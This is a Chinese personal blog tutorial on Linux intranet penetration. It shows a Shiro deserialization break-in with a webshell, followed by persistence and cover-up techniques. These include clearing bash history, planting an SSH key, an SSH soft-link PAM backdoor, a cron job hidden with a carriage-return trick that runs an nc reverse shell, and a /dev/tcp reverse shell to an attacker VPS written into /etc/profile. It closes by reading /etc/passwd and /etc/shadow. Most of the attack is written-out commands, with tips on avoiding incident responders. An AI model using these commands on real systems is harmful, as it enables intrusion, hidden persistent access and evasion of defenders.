<script type="text/javascript" src="/js/crash_cheat.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>内网渗透初探(三)｜差缺补漏 | jasson个人博客</title><meta name="keywords" content="内网渗透"><meta name="author" content="jasson"><meta name="copyright" content="jasson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="内网渗透初探(三)">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透初探(三)｜差缺补漏">
<meta property="og:url" content="https://j-jasson2.github.io/2021/12/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%B8%89)%EF%BD%9C%E5%B7%AE%E7%BC%BA%E8%A1%A5%E6%BC%8F/index.html">
<meta property="og:site_name" content="jasson个人博客">
<meta property="og:description" content="内网渗透初探(三)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://j-jasson2.github.io/images/neiwang.png">
<meta property="article:published_time" content="2021-12-11T02:45:41.000Z">
<meta property="article:modified_time" content="2022-01-05T06:05:21.689Z">
<meta property="article:author" content="jasson">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://j-jasson2.github.io/images/neiwang.png"><link rel="shortcut icon" href="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&refer=http%3A%2F%2Finews.gtimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630728108&t=1576409e5f212dd7279b9a1c880c7086"><link rel="canonical" href="https://j-jasson2.github.io/2021/12/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%B8%89)%EF%BD%9C%E5%B7%AE%E7%BC%BA%E8%A1%A5%E6%BC%8F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内网渗透初探(三)｜差缺补漏',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-05 14:05:21'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/neiwang.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">jasson个人博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透初探(三)｜差缺补漏</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-11T02:45:41.000Z" title="发表于 2021-12-11 10:45:41">2021-12-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-05T06:05:21.689Z" title="更新于 2022-01-05 14:05:21">2022-01-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透初探(三)｜差缺补漏"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer"/>

<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>从linux打进去到域环境，到获取域控权限。因为前面基本都是在讲windows，这里补一篇linux的，全篇实操，喜欢的小伙伴们快来呀~</p>
<h2 id="二、外网打点"><a href="#二、外网打点" class="headerlink" title="二、外网打点"></a>二、外网打点</h2><p>1、打开站点，很正常的一个登录界面<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637224801214-bc1f7b56-efbd-482e-a1f6-dfec2e82224d.png#clientId=u9f95c075-eccb-4&from=paste&height=723&id=u992b72cf&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1446&originWidth=1984&originalType=binary&ratio=1&size=130581&status=done&style=none&taskId=u6d202149-7e8f-4873-b7e9-e2fd1039296&width=992" alt="image.png"><br>2、尝试登录后发现典型的shiro特征。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637224920561-cce44b44-ae6a-47fd-8090-db46515acd34.png#clientId=u9f95c075-eccb-4&from=paste&height=411&id=u85564385&margin=%5Bobject%2Object%5D&name=image.png&originHeight=822&originWidth=1844&originalType=binary&ratio=1&size=277856&status=done&style=none&taskId=uc9ba8ecf-556e-437e-933b-504fe7e6adf&width=922" alt="image.png"><br>3、使用工具直接打shiro反序列化即可。<br>下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637290041845-bdcc864a-f4a8-433b-81b9-95dd485dce04.png#clientId=ub25c32ed-7728-4&from=paste&height=796&id=u390824fb&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1592&originWidth=2000&originalType=binary&ratio=1&size=205830&status=done&style=none&taskId=ub30e023c-36a5-426d-bff4-3c5c3732d50&width=1000" alt="image.png"><br>4、直接上冰蝎马，连接<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637290024157-fc910b03-4d41-4725-90ce-6141668613d9.png#clientId=ub25c32ed-7728-4&from=paste&height=796&id=ufa8ffae6&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1592&originWidth=2000&originalType=binary&ratio=1&size=248051&status=done&style=none&taskId=uf38dbd64-5f1d-49c3-9e14-c206a470662&width=1000" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637290108893-c0683071-0c78-4aae-8027-55512b9625fe.png#clientId=ub25c32ed-7728-4&from=paste&height=801&id=u6208ef07&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1602&originWidth=2000&originalType=binary&ratio=1&size=478004&status=done&style=none&taskId=u9ae6f5fe-a9a9-4319-8c42-2753d55003d&width=1000" alt="image.png"></p>
<h2 id="三、权限维持"><a href="#三、权限维持" class="headerlink" title="三、权限维持"></a>三、权限维持</h2><p>权限维持其实看了很多文章，都是有包括修改用户的，但是因为应急响应排查最先的就是用户登录情况，/etc/passwd，/etc/shadow文件修改情况，所以这里其实不太推荐这样做。<br>当然下面介绍的几种也是比较常用的，简单操作的，操作其实还是有些明显的，可以挑选一两个用就好，毕竟，操作越少被发现的可能就越低嘛；也可以选择做多几个权限维持，一个去掉了还有另一个嘛～</p>
<h3 id="一-、隐藏历史记录"><a href="#一-、隐藏历史记录" class="headerlink" title="(一)、隐藏历史记录"></a>(一)、隐藏历史记录</h3><p>1、在命令前加空格，命令不会被记录</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[空格]cat /etcpasswd</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637302387682-1c696ec1-e2a8-4d13-9baa-e5723bc48aab.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=290&id=u8d64f6e8&margin=%5Bobject%2Object%5D&name=image.png&originHeight=580&originWidth=1416&originalType=binary&ratio=1&size=440785&status=done&style=none&taskId=uf3eb6b89-a148-4ac0-bbad-825bf00f3fe&width=708" alt="image.png"></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637302474328-e2a38c39-154d-4d61-afb9-602535f04e05.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=100&id=u13a2849b&margin=%5Bobject%2Object%5D&name=image.png&originHeight=200&originWidth=894&originalType=binary&ratio=1&size=114839&status=done&style=none&taskId=uc4bdfdd5-1774-4fce-a2c5-7217a9791a7&width=447" alt="image.png"><br>可以看到命令只记录了一条<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637302498219-58cd2b27-2ce2-40db-b95e-04edd9cce0c5.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=113&id=ud8a38484&margin=%5Bobject%2Object%5D&name=image.png&originHeight=226&originWidth=608&originalType=binary&ratio=1&size=53813&status=done&style=none&taskId=uda803879-1338-44d7-955a-6f9f75b35b3&width=304" alt="image.png"><br>2、设置命令不记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[空格]set +o history</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637303311822-babfaf50-5b95-49ff-9f2d-9acd2290e518.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=231&id=uc290e337&margin=%5Bobject%2Object%5D&name=image.png&originHeight=462&originWidth=2032&originalType=binary&ratio=1&size=89994&status=done&style=none&taskId=u2f28766e-d5b2-4699-aa14-a6d63c6b768&width=1016" alt="image.png"><br>恢复</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -o history</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637303370305-15cd7733-34c1-44ae-a39d-9c0217caf8d6.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=258&id=u22d3afb2&margin=%5Bobject%2Object%5D&name=image.png&originHeight=516&originWidth=1668&originalType=binary&ratio=1&size=94223&status=done&style=none&taskId=uf6af5831-3c59-4445-8fdd-b1096a3fbb7&width=834" alt="image.png"><br>3、删除history文件中指定行的命令，[num]为每行命令左边的标识。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure>
<p>可以看到原本的1命令已被删除<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637309172654-794e95ac-22bf-4f71-b6b7-1df3d407ef8d.png#clientId=u558c584e-7fea-4&from=paste&height=196&id=u2fe62158&margin=%5Bobject%2Object%5D&name=image.png&originHeight=392&originWidth=1118&originalType=binary&ratio=1&size=59933&status=done&style=none&taskId=u99fa0488-0402-4842-bc33-0b2180d3933&width=559" alt="image.png"><br>4、粗暴点的，直接删除history文件内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">向<span class="built_in">history</span>文件写入空内容，覆盖原本内容</span></span><br><span class="line">echo &gt; ~/.bash_history</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">清空当前<span class="built_in">history</span>记录</span></span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637302859374-c899c89b-9b3a-4d41-a09d-f198802876fc.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=202&id=u3261be60&margin=%5Bobject%2Object%5D&name=image.png&originHeight=404&originWidth=1158&originalType=binary&ratio=1&size=37798&status=done&style=none&taskId=u75bdb649-f0c7-4139-ac3c-0b101ac2b40&width=579" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637309112596-f38437bd-f381-4d3a-9674-0136d8a62a5d.png#clientId=u558c584e-7fea-4&from=paste&height=78&id=u138c1754&margin=%5Bobject%2Object%5D&name=image.png&originHeight=156&originWidth=1068&originalType=binary&ratio=1&size=25771&status=done&style=none&taskId=u309dddd1-0733-4033-b7b4-30077a97de8&width=534" alt="image.png"></p>
<h3 id="二-、SSH公钥写入"><a href="#二-、SSH公钥写入" class="headerlink" title="(二)、SSH公钥写入"></a>(二)、SSH公钥写入</h3><p>ssh连接相当于拿到目标主机的一个shell。除了使用账号密码进行连接以外，还有一种方式便是通过将ssh密钥写入**/root/.ssh/authorized_keys**目录下，然后便可以免密码登录了。<br>​</p>
<p>熟悉redis未授权访问漏洞的利用手法的话，对这种方式一定不会陌生。这也是一种留下后门的方式。</p>
<p>生成ssh密钥，输入命令，按三次回车即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>生成后在～/.ssh/文件夹中发现密钥已经成功生成了。其中id_rsa为私钥，id_rsa.pub为公钥<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637311351110-cfa1aef7-370e-4e02-8400-285e0636e9b1.png#clientId=u558c584e-7fea-4&from=paste&height=78&id=ue6920785&margin=%5Bobject%2Object%5D&name=image.png&originHeight=156&originWidth=966&originalType=binary&ratio=1&size=93995&status=done&style=none&taskId=uf2a09256-67de-4b8a-aefd-4978c4fa6b1&width=483" alt="image.png"><br>将id_rsa.pub文件内容输入到～/.ssh/authorized_keys文件中，如果没有这个文件，那就自己新建<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637312470168-4bc9af05-34e0-4606-aea8-ed6618276f69.png#clientId=u8b09942e-e541-4&from=paste&height=196&id=uac1b5769&margin=%5Bobject%2Object%5D&name=image.png&originHeight=392&originWidth=2262&originalType=binary&ratio=1&size=466788&status=done&style=none&taskId=u26dceadc-61b7-4f7b-9b2e-46f8c529131&width=1131" alt="image.png"><br>尝试ssh连接成功</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.211.55.4</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637312603893-26181e94-ab9c-45b5-aef0-dadffa147483.png#clientId=u8b09942e-e541-4&from=paste&height=368&id=uca88dd1e&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=1470&originalType=binary&ratio=1&size=714374&status=done&style=none&taskId=ubf20cb21-1774-4f65-82b7-2c1c9453a22&width=735" alt="image.png"></p>
<h3 id="三-、SSH软连接"><a href="#三-、SSH软连接" class="headerlink" title="(三)、SSH软连接"></a>(三)、SSH软连接</h3><p>原理：<br>在sshd服务配置启用PAM认证的前提下，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功登录。<br>​</p>
<p>也就是说当开启了pam认证后，只需要找到文件配置为auth sufficient pam_rootok.so的即可。<br>1、输入命令，生成软连接，端口为10022。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=10022 </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637312755441-87352000-1589-4307-b2d8-8c7bb794e9e4.png#clientId=u8b09942e-e541-4&from=paste&height=167&id=u45e25724&margin=%5Bobject%2Object%5D&name=image.png&originHeight=334&originWidth=1118&originalType=binary&ratio=1&size=95652&status=done&style=none&taskId=u14b2a332-5323-4e92-8571-cee12f12125&width=559" alt="image.png"><br>2、ssh连接，密码任意输入，成功登录。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637312798457-070a4277-1b14-44e2-93f0-4dc6e3350ff3.png#clientId=u8b09942e-e541-4&from=paste&height=213&id=u18ee28aa&margin=%5Bobject%2Object%5D&name=image.png&originHeight=426&originWidth=1242&originalType=binary&ratio=1&size=294025&status=done&style=none&taskId=ud29b1475-a315-4fe3-92bb-130203d3f20&width=621" alt="image.png"><br>3、好用是好用，但是容易被发现，输入ps-aux就可以发现了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637313188400-d8efe1cf-1de4-4a05-90cd-988ebf8d2c1a.png#clientId=u8b09942e-e541-4&from=paste&height=222&id=u3b7841af&margin=%5Bobject%2Object%5D&name=image.png&originHeight=444&originWidth=2204&originalType=binary&ratio=1&size=912010&status=done&style=none&taskId=ub6bfcda5-725f-4dd9-9235-8b1d9ff1a3a&width=1102" alt="image.png"></p>
<h3 id="四-、计划任务"><a href="#四-、计划任务" class="headerlink" title="(四)、计划任务"></a>(四)、计划任务</h3><p>1、新建一个cron.sh文件，这里我执行的命令是nc反弹shell，使用其他命令也是可以的。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637317555826-3eaef204-4979-4988-8f0a-beb73cde5e34.png#clientId=u8b09942e-e541-4&from=paste&height=122&id=ig6nm&margin=%5Bobject%2Object%5D&name=image.png&originHeight=244&originWidth=780&originalType=binary&ratio=1&size=107334&status=done&style=none&taskId=ub9ddfa4f-b899-4924-9803-e9dd1584ed7&width=390" alt="image.png"><br>2、设置计划任务，这里*/3表示每3分钟执行一次。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;<span class="keyword">printf</span> <span class="string">&quot;*/3 * * * * /bin/bash /tmp/cron.sh;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637317573602-5bdd1a8b-b113-4b90-9d87-23f1e2730149.png#clientId=u8b09942e-e541-4&from=paste&height=92&id=ub68cab10&margin=%5Bobject%2Object%5D&name=image.png&originHeight=184&originWidth=1296&originalType=binary&ratio=1&size=131821&status=done&style=none&taskId=u4c2b2690-6d23-4d8f-b5cd-f04352da134&width=648" alt="image.png"><br>3、成功隐藏计划任务<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637317640630-7444dff0-4f71-496e-8135-9c18cd6a9310.png#clientId=u8b09942e-e541-4&from=paste&height=110&id=u612bbeb2&margin=%5Bobject%2Object%5D&name=image.png&originHeight=182&originWidth=742&originalType=binary&ratio=1&size=50349&status=done&style=none&taskId=u7f226aed-eb99-4572-ba21-864abc8ffe2&width=447" alt="image.png"><br>4、获取反弹shell<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637317479599-ff26565f-bdc4-45d1-a5d3-74f4f1ebcdb2.png#clientId=u8b09942e-e541-4&from=paste&height=97&id=ub266ff22&margin=%5Bobject%2Object%5D&name=image.png&originHeight=194&originWidth=1034&originalType=binary&ratio=1&size=136992&status=done&style=none&taskId=u3eb33a06-b5ba-463d-a811-099104467db&width=517" alt="image.png"></p>
<h3 id="五-、通过环境变量植入后门"><a href="#五-、通过环境变量植入后门" class="headerlink" title="(五)、通过环境变量植入后门"></a>(五)、通过环境变量植入后门</h3><p>常见的环境变量路径如下：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/etc/profile</span><br><span class="line">/etc/profile.d/*.sh</span><br><span class="line">~<span class="regexp">/.bash_profile</span></span><br><span class="line"><span class="regexp">~/</span>.profile</span><br><span class="line">~<span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">~/</span>bash_logout</span><br><span class="line">/etc/bashrc</span><br><span class="line">/etc/bash.bashrc</span><br></pre></td></tr></table></figure>
<p>将反弹shell命令写入环境变量</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/[vps-ip]/[port] 0&gt;&amp;1&#x27;</span> &gt;&gt; <span class="regexp">/etc/pr</span>ofile</span><br></pre></td></tr></table></figure>
<p>这样当系统重启了之后，便会将shell反弹到vps上了</p>
<h2 id="四、主机信息收集"><a href="#四、主机信息收集" class="headerlink" title="四、主机信息收集"></a>四、主机信息收集</h2><p>获取权限后，需要进行一定的信息收集</p>
<h3 id="一-、查询账户信息"><a href="#一-、查询账户信息" class="headerlink" title="(一)、查询账户信息"></a>(一)、查询账户信息</h3><p>whoami<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637290144549-0a13754f-b292-40ab-aeb4-4fd8bbee1fd1.png#clientId=ub25c32ed-7728-4&from=paste&height=250&id=RmP2o&margin=%5Bobject%2Object%5D&name=image.png&originHeight=500&originWidth=1104&originalType=binary&ratio=1&size=50046&status=done&style=none&taskId=u05cfa741-24f3-446d-94dd-b787655cf73&width=552" alt="image.png"><br>id<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291353932-5b1384e5-f824-4388-a3f9-8b7354560aa7.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=54&id=bWxzO&margin=%5Bobject%2Object%5D&name=image.png&originHeight=108&originWidth=586&originalType=binary&ratio=1&size=10263&status=done&style=none&taskId=u020bbb7a-7fde-4def-872d-8ddc782fee1&width=293" alt="image.png"><br>cat /etc/passwd<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291394087-8bf659e3-3fb3-4b6b-8f13-3cd89659a826.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=621&id=my2jj&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1242&originWidth=1430&originalType=binary&ratio=1&size=270047&status=done&style=none&taskId=ubaada3e6-2587-4913-954f-b58f39d939d&width=715" alt="image.png"><br>cat /etc/shadow<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291440205-5b2657f7-baa6-456d-aa12-45f3e36924cd.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=257&id=hzWQO&margin=%5Bobject%2Object%5D&name=image.png&originHeight=514&originWidth=1818&originalType=binary&ratio=1&size=96842&status=done&style=none&taskId=u7f6e4525-dd90-46af-9349-63865953414&width=909" alt="image.png"></p>
